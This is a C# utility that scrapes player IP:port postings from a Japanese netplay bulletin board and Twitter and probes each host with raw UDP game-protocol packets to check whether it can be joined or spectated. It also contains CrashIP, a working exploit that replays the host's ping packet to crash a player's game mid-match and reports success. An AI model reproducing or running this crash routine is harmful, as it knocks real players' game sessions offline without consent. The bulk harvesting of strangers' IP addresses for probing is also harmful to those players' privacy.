using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Text.RegularExpressions;
using System.Net.Security;
using System.Net;
using System.Net.Sockets;
using SnprIpGet;


namespace SnprIPGet
{
    public class SnprIpHelper
    {
        /*
         * 获取指定难度的串,其中如果获取失败会再次尝试,至多10次
         */
        public static int GetLineIdEx(string Difficulty)
        {
            int ret=-1;
            for(int i=0;i<10;++i)
            {
                if ((ret = GetLineId(Difficulty)) != -1)
                    break;
            }
            return ret;
        }
        /*
        * 获取指定难度的串
        */
        public static int GetLineId(string Difficulty)
        {
            int HardID=-1;
            HttpWebResponse ret;
            string str;
            try
            {
                ret = HttpHelper.CreateGetHttpResponse(@"http://jbbs.shitaraba.net/netgame/14382/", 60, "", null);
                str = HttpHelper.GetResponseString(ret);
                ///bbs/read.cgi/netgame/14382/1432657204/l50">4</a> : <a rel="nofollow" href="#4">【テンプレ必読】「Hard」ネット対戦スレッド -008-
                MatchCollection Matches = Regex.Matches(str, "<a rel=\"nofollow\" href=\"/bbs/read.cgi/netgame/14382/([0-9]+)/l50[^【]{1,100}【テンプレ必読】「" + Difficulty + "」ネット対戦スレッド");
                //MessageBox.Show(Matches[0].Result("$1"));
                HardID = int.Parse(Matches[0].Result("$1"));
            }
            catch(Exception)
            {
                //Ignore Exception,And Return -1
            }
            //Console.Write("HardID Get:" + HardID + "\r\n");
            return HardID;
        }

        public static string GetShitabaraInfo(int LineId,int LatestCnt)
        {
            HttpWebResponse ret;
            string str, retstr,tmp;
            string rcstr;//Repeat Check String;
            List<string> ipArr=new List<string>();
            bool fndFlag;
            try
            {
                ret = HttpHelper.CreateGetHttpResponse(@"http://jbbs.shitaraba.net/bbs/rawmode.cgi/netgame/14382/" + LineId + "/l" + LatestCnt, 60, "", null);
                str = HttpHelper.GetResponseString(ret);
                retstr ="\r\n";// "当前揭示板Lunatic难度IP:(更新时间:" + DateTime.Now.ToString() + ")\r\n";
                MatchCollection Matches = Regex.Matches(str, @"([0-9]+)<>([^<]*)<>([^<]*)<>([^<]*)<>([^\n]+?)<>([^<]*)<>([^<]*)\n");
                foreach (Match mat in Matches)
                {

                    tmp=GetIPInfo(LineId, mat);
                    if (tmp == "") continue;//如果是空的则不执行下面的代码
                    rcstr = Regex.Match(tmp, "([^ ]+?)[ ]*\t").Result("$1");
                    fndFlag = false;
                    for (int i = 0; i < ipArr.Count;++i)
                    {
                        if (ipArr[i] == rcstr) fndFlag = true;
                    }

                    if (!fndFlag)
                    {
                        ipArr.Add(rcstr);
                        retstr += tmp;
                    }
                }
            }
            catch(WebException)
            {
                retstr = "\r\n 错误:无法访问揭示板!";
            }
            return retstr;
        }

        /*
         * 获取Twitter上指定Tag上的IP信息
         */
        public static string GetTwitterTagInfo(string tagName)
        {
            HttpWebResponse ret;
            string str, retstr;
            try
            {
                ret = HttpHelper.CreateGetHttpResponse(@"https://twitter.com/hashtag/" + tagName, 60, "", null);
                str = HttpHelper.GetResponseStringRegular(ret);
                retstr = "";
                int i = 0;
                string check;

                MatchCollection Matches = Regex.Matches(str, "with-id\" data-aria-label-part>([^<]+)[.\\s\\S]*?last\">([^<]+)[.\\s\\S]*?([0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+:[0-9]+)");//"<small class=\"time\">.*?title=\"([^\"]+)\".*?([0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+:[0-9])");
                foreach (Match mat in Matches)
                {
                    check = CheckIPEx(mat.Result("$3"));
                    if (check[0] == 'U') continue;//$2是时间 $3是ip $1是用户名
                    retstr += "\r\n" + mat.Result("$3") + "\t" + check + "\t" + mat.Result("$1");
                    i++;
                    if (i == 5) break;
                }
            }
            catch(Exception e)
            {
                retstr = "" + e.ToString();
            }
            return retstr;
        }

        /*
         *  获取深秘录揭示板上指定HardID串中指定Talkid中包含的IP信息
         *  
         */
        public static string GetIPInfo(int HardID, int talkid)
        {
            HttpWebResponse ret;
            string str;
            try
            {
                ret = HttpHelper.CreateGetHttpResponse(@"http://jbbs.shitaraba.net/bbs/rawmode.cgi/netgame/14382/" + HardID + "/" + talkid, 60, "", null);
                str = HttpHelper.GetResponseString(ret);
                Match Match = Regex.Match(str, @"([0-9]+)<>([^<]*)<>([^<]*)<>([^<]*)<>([^\n]+?)<>([^<]*)<>([^<]*)\n");
                if (Match.Success)
                {
                    return GetIPInfo(HardID, Match);
                }
            }
            catch(Exception)
            {
                //Skip Exception,And Return Nothing
            }
            return "";
        }

        /*
         * 获取深秘录揭示板上指定对话中的IP(不过输入的参数是已经通过正则匹配预处理了
         */
        private static string GetIPInfo(int  HardID, Match info)
        {
            string check;
            Match infomat = Regex.Match(info.Result("$5"), "【IP:Port】([^<]+)<br>[^○]+【使用キャラ】([^<]+)");
            if (infomat.Success)
            {
                check = CheckIPEx(infomat.Result("$1"));
                if (check[0] == 'U') return "";
                return infomat.Result("$1") + "\t" + infomat.Result("$2") + " \t" + check + "\r\n";
            }
            infomat = Regex.Match(info.Result("$5"), "【IP】([^<]+)<br>【Port】([^<]+)<br>[^○]+【使用キャラ】([^<]+)");
            if (infomat.Success)
            {
                check = CheckIPEx(infomat.Result("$1") + ":" + infomat.Result("$2"));
                if (check[0] == 'U') return "";
                return infomat.Result("$1") + ":" + infomat.Result("$2") + " \t" + infomat.Result("$3") + " \t" + check + "\r\n";
            }
            infomat = Regex.Match(info.Result("$5"), "&gt;&gt;([0-9]+)</a>再募集");
            if (infomat.Success)
            {
                return GetIPInfo(HardID,int.Parse(infomat.Result("$1")));
            }
            infomat = Regex.Match(info.Result("$5"), "&gt;&gt;([0-9]+)</a>〆");
            if (infomat.Success)
            {
                return GetIPInfo(HardID,int.Parse(infomat.Result("$1")));
            }
            return "";
        }

        /*
         * 混合了对录的和对则的IP检测方式的程序
         */
        public static string CheckIPEx(string str)
        {
            int i;
            string ret = "";
            for (i = 0; i < 2; i++)//首先检测则的,然后是录的
            {
                if (i != 0)
                    ret = CheckIP_FXTZ(str) + "(则)";
                else
                    ret = CheckIP(str) + " (录)";
                if (!Regex.Match(ret, @"Unavailable\(.+\)").Success)
                {
                    break;
                }
                else
                    ret = "Unavailable";
            }
            return ret;
        }


        /*
         * 对则的IP数据包检测
         */
        public static string CheckIP_FXTZ(string str)
        {
            Match mat = Regex.Match(str, "([0-9]+).([0-9]+).([0-9]+).([0-9]+):(.+)");
            byte[] ipArr = new byte[4];
            Random r = new Random();
            int i;
            IPAddress addr;
            try
            {
                for (i = 1; i < 5; ++i)
                {
                    ipArr[i - 1] = byte.Parse(mat.Result("$" + i));
                }
                addr = new IPAddress(ipArr);
            }
            catch (Exception)
            {
                return "Unavailable-Invaild IP";
            }
            int port = int.Parse(mat.Result("$5"));
            UdpClient ptarget=null;
            for (int tmp = 0; tmp < 10;tmp++ ){
                try
                {
                    ptarget = new UdpClient(r.Next(10000, 30000));
                }
                catch (Exception)
                {
                    //Skip This Exception
                }
                if(ptarget!=null)break;
            }
            if (ptarget == null) return "Unavailable- Can't Bind to a Port";
            List<Socket> sk = new List<Socket>();
            Byte[] pingdata = new Byte[37]
		            {
			            0x01, 0x02, 0x00, 0x2a, 0x30, 0x70, 0x6f, 0x63, 0x55, 0x00,
			            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x2a,
			            0x30, 0x70, 0x6f, 0x63, 0x55, 0x00, 0x00, 0x00, 0x00, 0x00,
			            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
		            }; ;

            int before = Environment.TickCount;
            try
            {
                ptarget.Send(pingdata, 37, new IPEndPoint(addr, port));
                ptarget.Send(pingdata, 37, new IPEndPoint(addr, port));
                ptarget.Send(pingdata, 37, new IPEndPoint(addr, port));
            }
            catch(Exception)
            {
                return "Unavailable";
            }
            //Send More than one time,refer to Snpr
            sk.Add(ptarget.Client);
            Socket.Select(sk, null, null, (int)2 * 1000);
            int currentdelay = Environment.TickCount - before;
            IPEndPoint ipe = new IPEndPoint(0, 0);
            try
            {
                for (; ; )
                {
                    ptarget.Client.ReceiveTimeout = 200;
                    byte[] rdata = ptarget.Receive(ref ipe);
                    if (rdata.Length == 1 && rdata[0] == 3)
                    {
                        ptarget.Close();
                        return "可连接";
                        //ptarget.Send(querybattle, 110, new IPEndPoint(addr, port));
                        //continue;
                    }

                    break;
                }
            }
            catch (Exception)
            {
                //Remote Host Closed This Connection
                ptarget.Close();
                return "Unavailable";
            }
            //No Reply
            ptarget.Close();
            return "Unavailable";
        }


        /*
         * 对录的数据包检测
         */
        public static string CheckIP(string str)
        {
            Match mat = Regex.Match(str, "([0-9]+).([0-9]+).([0-9]+).([0-9]+):(.+)");
            byte[] ipArr = new byte[4];
            Random r = new Random();
            int i;
            IPAddress addr;
            try
            {
                for (i = 1; i < 5; ++i)
                {
                    ipArr[i - 1] = byte.Parse(mat.Result("$" + i));
                }
                addr = new IPAddress(ipArr);
            }
            catch (Exception)
            {
                return "Unavailable-Invaild IP";
            }
            int port = int.Parse(mat.Result("$5"));
            UdpClient ptarget = null;
            for (int tmp = 0; tmp < 10; tmp++)
            {
                try
                {
                    ptarget = new UdpClient(r.Next(10000, 30000));
                }
                catch (Exception)
                {
                    //Skip This Exception
                }
                if (ptarget != null) break;
            }
            if (ptarget == null) return "Unavailable- Can't Bind to a Port";
            List<Socket> sk = new List<Socket>();
            Byte[] pingdata = new Byte[24]
            {
                0x08,0x57,0x09,0xf6,0x67,0xf0,0xfd,0x4b,
                0xd0,0xb9,0x9a,0x74,0xf8,0x38,0x33,0x81,
                0x88,0x00,0x00,0x00,0xa4,0x7d,0x12,0x00
            };
            pingdata[20] = (Byte)r.Next(0, 255);
            pingdata[21] = (Byte)r.Next(0, 255);
            pingdata[22] = (Byte)r.Next(0, 255);
            Byte[] querybattle = new Byte[110]
            {
                0x09,0x57,0x09,0xf6,0x67,0xf0,0xfd,0x4b,0xd0,0xb9,0x9a,0x74,0xf8,
                0x38,0x33,0x81,0x88,0x00,0x00,0x00,0x56,0xc2,0x51,0x01,0x00,0x00,
                0x00,0x00,0x00,0x00,0x4a,0x00,0x4a,0x00,0x00,0x01,0x4b,0x00,0x00,
                0x00,0x78,0x9c,0x13,0x60,0x60,0xe0,0xe0,0x60,0x60,0x60,0xc8,0x2c,
                0x8e,0x2f,0x4f,0x2c,0x49,0xce,0x00,0xb2,0x19,0x19,0x05,0x80,0x82,
                0xec,0x40,0xc1,0xb2,0xd4,0xa2,0xe2,0xcc,0xfc,0x3c,0x26,0x06,0x06,
                0x56,0x71,0x15,0x31,0x06,0x90,0x30,0x37,0x50,0x38,0x23,0x33,0x25,
                0x25,0x35,0x2f,0x3e,0x39,0x23,0xb1,0x08,0x24,0x05,0x52,0xc9,0x08,
                0x44,0x00,0xc6,0xa8,0x0b,0x96
            };
            Byte[] disconnect = new byte[12]
            {
                0x10,0x07,0x16,0x01,0xe3,0x80,0x0f,0x00,0x02,0x00,0x00,0x00
            };
            int before = Environment.TickCount;
            try
            {
                ptarget.Send(pingdata, 24, new IPEndPoint(addr, port));
                ptarget.Send(pingdata, 24, new IPEndPoint(addr, port));
                ptarget.Send(pingdata, 24, new IPEndPoint(addr, port));
            }
            catch(Exception)
            {
                return "Unavailable";
            }
            sk.Add(ptarget.Client);
            Socket.Select(sk, null, null, (int)2 * 1000);
            int currentdelay = Environment.TickCount - before;
            IPEndPoint ipe = new IPEndPoint(0, 0);
            try
            {
                for (; ; )
                {
                    ptarget.Client.ReceiveTimeout = 200;
                    byte[] rdata = ptarget.Receive(ref ipe);
                    if (rdata.Length == 1 && rdata[0] == 4)
                    {
                        //ptarget.Close();
                        //return true;
                        ptarget.Send(querybattle, 110, new IPEndPoint(addr, port));
                        continue;
                    }
                    else if (rdata.Length == 32 && rdata[0] == 7)//Ping包?
                    {
                        //禁止的情况不会有这种ping包
                        ptarget.Send(disconnect, 12, new IPEndPoint(addr, port));
                        ptarget.Close();
                        return "可以观战";
                        //ptarget.Send(rdata, 32, new IPEndPoint(addr, port));
                        continue;
                    }
                    else if (rdata.Length == 32 && rdata[0] == 0x0c)
                    {
                        ptarget.Close();
                        return "观战不能";
                    }
                    else if (rdata.Length == 92 && rdata[0] == 0x0b)
                    {
                        ptarget.Send(disconnect, 12, new IPEndPoint(addr, port));
                        ptarget.Close();
                        return "可以观战";
                    }
                    break;
                }
            }
            catch (Exception e)
            {
                ptarget.Close();
                return "Unavailable";
            }
            ptarget.Close();
            return "Unavailable";
        }
        public static string CrashIP(string str)
        {
            Match mat = Regex.Match(str, "([0-9]+).([0-9]+).([0-9]+).([0-9]+):(.+)");
            byte[] ipArr = new byte[4];
            Random r = new Random();
            int i;
            IPAddress addr;
            try
            {
                for (i = 1; i < 5; ++i)
                {
                    ipArr[i - 1] = byte.Parse(mat.Result("$" + i));
                }
                addr = new IPAddress(ipArr);
            }
            catch (Exception)
            {
                return "Unavailable-Invaild IP";
            }
            int port = int.Parse(mat.Result("$5"));
            UdpClient ptarget = null;
            for (int tmp = 0; tmp < 10; tmp++)
            {
                try
                {
                    ptarget = new UdpClient(r.Next(10000, 30000));
                }
                catch (Exception)
                {
                    //Skip This Exception
                }
                if (ptarget != null) break;
            }
            if (ptarget == null) return "Unavailable- Can't Bind to a Port";
            List<Socket> sk = new List<Socket>();
            Byte[] pingdata = new Byte[24]
            {
                0x08,0x57,0x09,0xf6,0x67,0xf0,0xfd,0x4b,
                0xd0,0xb9,0x9a,0x74,0xf8,0x38,0x33,0x81,
                0x88,0x00,0x00,0x00,0xa4,0x7d,0x12,0x00
            };
            pingdata[20] = (Byte)r.Next(0, 255);
            pingdata[21] = (Byte)r.Next(0, 255);
            pingdata[22] = (Byte)r.Next(0, 255);
            Byte[] querybattle = new Byte[110]
            {
                0x09,0x57,0x09,0xf6,0x67,0xf0,0xfd,0x4b,0xd0,0xb9,0x9a,0x74,0xf8,
                0x38,0x33,0x81,0x88,0x00,0x00,0x00,0x56,0xc2,0x51,0x01,0x00,0x00,
                0x00,0x00,0x00,0x00,0x4a,0x00,0x4a,0x00,0x00,0x01,0x4b,0x00,0x00,
                0x00,0x78,0x9c,0x13,0x60,0x60,0xe0,0xe0,0x60,0x60,0x60,0xc8,0x2c,
                0x8e,0x2f,0x4f,0x2c,0x49,0xce,0x00,0xb2,0x19,0x19,0x05,0x80,0x82,
                0xec,0x40,0xc1,0xb2,0xd4,0xa2,0xe2,0xcc,0xfc,0x3c,0x26,0x06,0x06,
                0x56,0x71,0x15,0x31,0x06,0x90,0x30,0x37,0x50,0x38,0x23,0x33,0x25,
                0x25,0x35,0x2f,0x3e,0x39,0x23,0xb1,0x08,0x24,0x05,0x52,0xc9,0x08,
                0x44,0x00,0xc6,0xa8,0x0b,0x96
            };
            Byte[] disconnect = new byte[12]
            {
                0x10,0x07,0x16,0x01,0xe3,0x80,0x0f,0x00,0x02,0x00,0x00,0x00
            };
            int before = Environment.TickCount;
            try
            {
                ptarget.Send(pingdata, 24, new IPEndPoint(addr, port));
                ptarget.Send(pingdata, 24, new IPEndPoint(addr, port));
                ptarget.Send(pingdata, 24, new IPEndPoint(addr, port));
            }
            catch(Exception)
            {
                return "Unavailable";
            }
            sk.Add(ptarget.Client);
            Socket.Select(sk, null, null, (int)2 * 1000);
            int currentdelay = Environment.TickCount - before;
            IPEndPoint ipe = new IPEndPoint(0, 0);
            bool crushflag = false;
            try
            {
                for (; ; )
                {
                    ptarget.Client.ReceiveTimeout = 200;
                    byte[] rdata = ptarget.Receive(ref ipe);
                    if (rdata.Length == 1 && rdata[0] == 4)
                    {
                        //ptarget.Close();
                        //return true;
                        ptarget.Send(querybattle, 110, new IPEndPoint(addr, port));
                        continue;
                    }
                    else if (rdata.Length == 32 && rdata[0] == 7)//Ping包?
                    {
                        //禁止的情况不会有这种ping包
                        //ptarget.Send(disconnect, 12, new IPEndPoint(addr, port));
                        //ptarget.Close();
                        //return "可以观战";
                        ptarget.Send(rdata, 32, new IPEndPoint(addr, port));
                        crushflag = true;
                        //ptarget.Close();
                        //return "成功崩掉!";
                        continue;
                    }
                    else if (rdata.Length == 32 && rdata[0] == 0x0c)
                    {
                        ptarget.Close();
                        return "观战不能";
                    }
                    else if (rdata.Length == 92 && rdata[0] == 0x0b)
                    {
                        ptarget.Send(disconnect, 12, new IPEndPoint(addr, port));
                        ptarget.Close();
                        return "可以观战";
                    }
                    break;
                }
            }
            catch (Exception e)
            {
                ptarget.Close();
                if (crushflag) return "成功崩掉!";
                return "Unavailable";
            }
            ptarget.Close();
            //return "成功崩掉!";
            return "Unavailable";
        }
    }

    /*
     * 崩了这个正在对战的ip!
     */
    
}
